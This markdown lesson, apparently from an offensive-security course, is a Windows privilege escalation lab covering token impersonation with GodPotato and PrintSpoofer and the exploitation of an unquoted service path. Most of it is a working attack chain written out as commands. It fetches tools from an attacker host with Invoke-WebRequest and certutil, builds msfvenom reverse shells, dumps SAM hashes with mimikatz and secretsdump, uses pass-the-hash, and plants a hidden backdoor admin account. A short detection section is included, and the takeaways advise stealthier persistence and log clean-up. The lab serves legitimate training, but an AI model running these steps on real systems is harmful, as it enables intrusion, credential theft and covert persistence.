---
title: "Windows PrivEsc Lab — Token Impersonation and Unquoted Service Path"
tags: [windows, privilege-escalation, token-impersonation, SeImpersonatePrivilege,
       unquoted-service-path, GodPotato, PrintSpoofer, lab, T1134, T1574.009,
       ATT&CK, hands-on]
module: 04-BroadSurface-04
day: 239
related_topics:
  - Windows PrivEsc Enumeration (Day 238)
  - Post-Exploitation Basics (Day 241)
  - Infrastructure Detection and Hardening (Day 244)
---

# Day 239 — Windows PrivEsc Lab: Token Impersonation and Unquoted Service Path

> "SeImpersonatePrivilege is the gift that keeps giving. Half the web shells
> you land on Windows IIS will have it. The escalation from there to SYSTEM
> has been a solved problem since 2016 — and yet enterprise environments still
> run IIS with application pools configured as LocalService. Know this path
> cold. You will use it constantly."
>
> — Ghost

---

## Goals

By the end of this lab you will have:

1. Exploited a token impersonation vulnerability (SeImpersonate) using GodPotato.
2. Exploited an unquoted service path to execute code as SYSTEM.
3. Dumped the local SAM database post-escalation.
4. Planted a persistence mechanism (new admin account).
5. Written Windows Event Log queries that detect both escalation paths.

**Time budget:** 5 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| Windows PrivEsc enumeration methodology | Day 238 |
| Token privileges and impersonation | Day 238 |
| Unquoted service path mechanics | Day 238 |

---

## Lab Setup

```bash
# Windows lab using Docker + Wine (for CTF-style practice) OR use a Windows VM
# Recommended: HackTheBox Retired Windows machines (Bastard, Devel, Bounty)
# Or: DVWA-style Windows lab container

# For local practice — minimal Windows lab:
# 1. Download Windows Server 2019 Evaluation (180-day, no key)
# 2. Install in VirtualBox/VMware, host-only network
# 3. Set up vulnerabilities manually (documented below)
# 4. Create low-priv user: labuser / Password123!

# Alternatively: connect to the provided lab VM
# IP: 10.10.10.5
# User: labuser / Password123!
# RDP: xfreerdp /u:labuser /p:'Password123!' /v:10.10.10.5
# Or: evil-winrm -i 10.10.10.5 -u labuser -p 'Password123!'
```

---

## Path 1 — Token Impersonation (SeImpersonatePrivilege)

### Step 1: Land in a Service Context

In a real engagement you arrive here via a web shell or RCE in an IIS/SQL
application. In the lab, simulate this:

```powershell
# Connect as labuser (represents a web shell in an IIS app pool context)
# The user has SeImpersonatePrivilege (check with whoami /priv)
whoami /priv | findstr /i "impersonate"
# Expected: SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

If it is **Enabled** — you have the path. If it is **Disabled** — check whether
you are in a service context or a standard interactive user context (interactive
user sessions typically do not have this privilege).

### Step 2: Upload GodPotato

```powershell
# From attacker: serve the tools
# python3 -m http.server 8000

# On target: download GodPotato
mkdir C:\Temp
Invoke-WebRequest -Uri http://<attacker-ip>:8000/GodPotato-NET4.exe -OutFile C:\Temp\gp.exe
# Or if PowerShell is restricted:
certutil.exe -urlcache -split -f http://<attacker-ip>:8000/GodPotato-NET4.exe C:\Temp\gp.exe
```

### Step 3: Execute as SYSTEM

```powershell
# Test: run whoami as SYSTEM
C:\Temp\gp.exe -cmd "cmd /c whoami"
# Expected: nt authority\system

# Add a local administrator:
C:\Temp\gp.exe -cmd "cmd /c net user ghost Password123! /add"
C:\Temp\gp.exe -cmd "cmd /c net localgroup administrators ghost /add"

# Verify:
net user ghost
net localgroup administrators

# Get an interactive shell:
# Option A: reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > C:\Temp\shell.exe
# (serve it from your attacker machine)
Invoke-WebRequest -Uri http://<attacker-ip>:8000/shell.exe -OutFile C:\Temp\shell.exe
C:\Temp\gp.exe -cmd "C:\Temp\shell.exe"
# nc -lvnp 4444 on attacker

# Option B: add admin and use PsExec/evil-winrm
evil-winrm -i 10.10.10.5 -u ghost -p 'Password123!'
```

### Alternative: PrintSpoofer

```powershell
# If Print Spooler service is running (common in older Windows):
sc query Spooler | findstr STATE

# Download PrintSpoofer:
Invoke-WebRequest -Uri http://<attacker-ip>:8000/PrintSpoofer64.exe `
  -OutFile C:\Temp\ps.exe

# Execute as SYSTEM:
C:\Temp\ps.exe -c "cmd.exe" -i
# Interactive cmd.exe as NT AUTHORITY\SYSTEM
```

---

## Path 2 — Unquoted Service Path

### Step 1: Find Vulnerable Services

```powershell
# Enumerate unquoted service paths (CMD):
wmic service get name,displayname,pathname,startmode | \
  findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# PowerShell version:
Get-WmiObject Win32_Service | Where-Object {
  $_.StartMode -eq 'Auto' -and
  $_.PathName -notmatch '^"' -and
  $_.PathName -match ' ' -and
  $_.PathName -notmatch '^C:\\Windows\\'
} | Select-Object Name, PathName

# Expected output includes a service like:
# VulnerableService  C:\Program Files\Vulnerable App\svc\service.exe
```

### Step 2: Identify the Writable Intermediate Path

```powershell
# For path: C:\Program Files\Vulnerable App\svc\service.exe
# Windows tries:
#   C:\Program.exe
#   C:\Program Files\Vulnerable.exe
#   C:\Program Files\Vulnerable App\svc\service.exe (real binary)

# Check permissions on C:\Program Files\ (usually not writable)
icacls "C:\Program Files"

# Check custom intermediate directories — these are often more permissive:
icacls "C:\Program Files\Vulnerable App"
# Look for: BUILTIN\Users:(OI)(CI)(W) or (F) — writable!
```

### Step 3: Plant the Payload

```powershell
# The vulnerable path: C:\Program Files\Vulnerable App\svc\service.exe
# Windows tries: C:\Program Files\Vulnerable.exe first

# If C:\Program Files\Vulnerable App\ is writable:
# Create: C:\Program Files\Vulnerable.exe (with space, no extension path)
# Actually create at: C:\Program Files\Vulnerable App\svc.exe
# (the next path Windows tries after the initial binary)

# Generate payload on attacker:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4445 -f exe -o svc.exe

# Copy to the intermediate writable path:
copy C:\Temp\svc.exe "C:\Program Files\Vulnerable App\svc.exe"

# Restart the service:
sc stop VulnerableService
sc start VulnerableService
# nc -lvnp 4445 on attacker → shell as SYSTEM (service runs as LocalSystem)
```

---

## Part 3 — Post-Escalation: SAM Dump

Once you have SYSTEM, extract the local credential hashes.

```powershell
# Method 1: reg save (manual)
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak
# Transfer to attacker and extract offline:
# secretsdump.py -sam sam.bak -system system.bak LOCAL

# Method 2: impacket from attacker (if SMB is accessible)
secretsdump.py ghost:Password123!@10.10.10.5

# Method 3: mimikatz (in-memory — higher EDR risk)
Invoke-WebRequest -Uri http://<attacker-ip>:8000/mimikatz.exe -OutFile C:\Temp\mimi.exe
C:\Temp\mimi.exe "lsadump::sam" "exit"

# Output format: username:RID:LMhash:NThash
# Use NT hashes for pass-the-hash attacks:
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<NThash> \
  //10.10.10.5 cmd.exe
```

---

## Part 4 — Persistence: Backdoor Admin Account

```powershell
# Already added 'ghost' as an admin in Part 1
# For persistence without an obvious account name:
net user svc_monitor Password123! /add /expires:never
net localgroup administrators svc_monitor /add
net user svc_monitor /active:yes

# Disable account expiry and hide from login screen:
Set-LocalUser -Name svc_monitor -PasswordNeverExpires $true
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" `
  /v svc_monitor /t REG_DWORD /d 0 /f

# Verify persistence:
net user svc_monitor
evil-winrm -i 10.10.10.5 -u svc_monitor -p 'Password123!'
```

---

## Part 5 — Detection

### Event Log Queries (PowerShell)

```powershell
# Token impersonation / SeImpersonate usage (Event 4673):
Get-WinEvent -FilterHashtable @{
  LogName='Security'; Id=4673
} | Where-Object { $_.Message -match 'SeImpersonatePrivilege' } |
  Format-List TimeCreated, Message

# New local account created (Event 4720):
Get-WinEvent -FilterHashtable @{
  LogName='Security'; Id=4720
} | Format-List TimeCreated, Message

# Account added to Administrators group (Event 4728 / 4732):
Get-WinEvent -FilterHashtable @{
  LogName='Security'; Id=4732
} | Where-Object { $_.Message -match 'Administrators' } |
  Format-List TimeCreated, Message

# Service configuration change (Event 7040 — SCM):
Get-WinEvent -FilterHashtable @{
  LogName='System'; Id=7040
} | Format-List TimeCreated, Message

# Unquoted service binary execution (new process from service path):
Get-WinEvent -FilterHashtable @{
  LogName='Security'; Id=4688
} | Where-Object { $_.Message -match 'C:\\Program Files' -and
  $_.Message -notmatch '"' } |
  Format-List TimeCreated, Message
```

### Sigma Rule Sketch

```yaml
title: SeImpersonate Privilege Escalation via Potato Attack
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection_privilege:
    EventID: 4673
    PrivilegeName: SeImpersonatePrivilege
  selection_process:
    EventID: 4688
    ParentImage|endswith:
      - '\msiexec.exe'
      - '\cmd.exe'
      - '\powershell.exe'
    IntegrityLevel: System
  filter_legitimate:
    SubjectUserName|endswith: '$'  # machine accounts
  condition: selection_privilege and selection_process and not filter_legitimate
level: high
```

---

## Key Takeaways

1. **GodPotato is reliable across Windows 2012–2022.** For any service account
   with SeImpersonatePrivilege on any supported Windows version, GodPotato
   provides SYSTEM with one command. Memorise this path.
2. **Unquoted service paths are a configuration audit finding, not just
   an exploitation path.** Any compliance audit will flag them. Organisations
   that are not doing regular audits accumulate them silently over years.
3. **SAM dump completes the escalation.** Hashes from SAM can be used for
   pass-the-hash laterally across all machines with the same local admin
   password — common before LAPS was widely deployed.
4. **Persistence as a hidden local admin is noisy in modern environments.**
   EDR products track new account creation and group membership changes.
   On monitored systems, use an existing dormant account or a more subtle
   persistence mechanism (startup registry key, scheduled task).
5. **Windows Event Logs are your footprint.** Events 4720, 4732, 7040, and
   4688 all log what you did. A SOC analyst reviewing these after the engagement
   will reconstruct your entire path. Speed and selective clean-up matter.

---

## Exercises

1. On the lab VM (or a Windows HackTheBox machine), achieve SYSTEM via
   the token impersonation path using only the tools available on the
   target (no uploads). What is available natively that helps?

2. Create a fresh Windows Server 2019 VM and deliberately introduce three
   privilege escalation paths: (a) an unquoted service path, (b)
   AlwaysInstallElevated enabled, (c) a writable service binary. Document
   the exact configuration changes needed so another student can reproduce
   the lab.

3. Research: what is LAPS (Local Administrator Password Solution)?
   How does it prevent the SAM dump → pass-the-hash lateral movement chain?
   If LAPS is deployed, what other post-escalation paths remain available?

4. Write a PowerShell script that monitors Windows Security event logs
   in real time and alerts when: (a) a new local user is created, (b) a user
   is added to the Administrators group, (c) a service binary path changes.
   Output alerts to the console with a timestamp.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q239.1, Q239.2 …).
> Follow-up questions use hierarchical numbering (Q239.1.1, Q239.1.2 …).

---

## Navigation

← Previous: [Day 238 — Windows PrivEsc Enumeration](DAY-0238-Windows-PrivEsc-Enumeration.md)
→ Next: [Day 240 — Container Escape](DAY-0240-Container-Escape.md)
